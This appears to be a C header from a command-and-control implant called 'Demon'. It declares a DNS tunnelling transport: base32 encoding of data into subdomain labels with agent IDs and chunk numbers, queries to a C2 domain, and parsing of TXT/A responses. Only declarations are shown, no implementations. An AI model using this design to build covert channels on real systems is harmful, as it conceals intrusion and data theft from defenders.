#ifndef DEMON_TRANSPORTDNS_H
#define DEMON_TRANSPORTDNS_H

#include <core/Win32.h>

#ifdef TRANSPORT_DNS

/* DNS Header struct — all fields network byte order (big-endian) */
typedef struct _DNS_HEADER
{
    UINT16 ID;       /* Transaction ID */
    UINT16 Flags;    /* DNS flags */
    UINT16 QDCount;  /* Question count */
    UINT16 ANCount;  /* Answer count */
    UINT16 NSCount;  /* Authority count */
    UINT16 ARCount;  /* Additional count */
} DNS_HEADER, *PDNS_HEADER;

/* DNS protocol constants */
#define DNS_HEADER_SIZE           12
#define DNS_MAX_LABEL_LEN         63
#define DNS_MAX_NAME_LEN          253
#define DNS_MAX_UDP_SIZE          512
#define DNS_MAX_DATA_PER_QUERY    90   /* conservative: ~90 bytes data → ~144 chars base32, fits in 3 labels */
#define DNS_TYPE_A                1
#define DNS_TYPE_TXT              16

/* RFC 4648 Base32 lowercase alphabet (no padding) */
#define DNS_BASE32_ALPHABET       "abcdefghijklmnopqrstuvwxyz234567"

/*!
 * Base32 encode a buffer (no padding)
 * @param Input     - data to encode
 * @param InputLen  - length of input data
 * @param Output    - output buffer (must be pre-allocated)
 * @param OutputLen - size of output buffer
 * @return actual output length
 */
DWORD DnsBase32Encode( PBYTE Input, DWORD InputLen, PCHAR Output, DWORD OutputLen );

/*!
 * Base32 decode a string (no padding)
 * @param Input     - base32 string to decode
 * @param InputLen  - length of input string
 * @param Output    - output buffer (must be pre-allocated)
 * @param OutputLen - size of output buffer
 * @return actual output length
 */
DWORD DnsBase32Decode( PCHAR Input, DWORD InputLen, PBYTE Output, DWORD OutputLen );

/*!
 * Build a DNS query packet with data encoded in subdomain labels
 * @param QueryBuf    - output buffer for the DNS packet
 * @param QueryBufLen - size of output buffer
 * @param Data        - data to encode in subdomain
 * @param DataLen     - length of data
 * @param AgentID     - agent ID for identification
 * @param SeqNum      - chunk sequence number
 * @param TotalParts  - total chunks
 * @param Domain      - C2 domain string
 * @return actual packet length, 0 on failure
 */
DWORD DnsBuildQuery( PCHAR QueryBuf, DWORD QueryBufLen, PBYTE Data, DWORD DataLen,
                     DWORD AgentID, WORD SeqNum, WORD TotalParts, PCHAR Domain );

/*!
 * Parse DNS response and extract data from TXT/A records
 * @param Response  - raw DNS response bytes
 * @param RespLen   - length of response
 * @param Output    - output buffer for extracted data
 * @param OutputLen - size of output buffer
 * @return actual data length, 0 on failure/no data
 */
DWORD DnsParseResponse( PBYTE Response, DWORD RespLen, PBYTE Output, DWORD OutputLen );

/*!
 * Send data via DNS transport and receive response
 * @param Send - data to send (will be chunked if needed)
 * @param Resp - response buffer (caller must free with LocalFree)
 * @return TRUE on success
 */
BOOL DnsSend( PBUFFER Send, PBUFFER Resp );

#endif /* TRANSPORT_DNS */

#endif /* DEMON_TRANSPORTDNS_H */
